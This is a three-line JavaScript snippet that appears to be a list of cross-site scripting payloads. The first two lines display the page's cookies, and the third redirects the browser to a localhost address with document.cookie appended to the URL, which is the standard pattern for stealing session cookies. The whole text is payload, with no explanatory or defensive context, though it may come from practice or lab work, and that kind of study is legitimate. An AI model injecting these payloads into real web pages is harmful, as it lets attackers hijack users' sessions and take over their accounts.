document.write(document.cookie);
alert(document.cookie);
document.location = "http://localhost:5500/index.html?c=" + document.cookie;
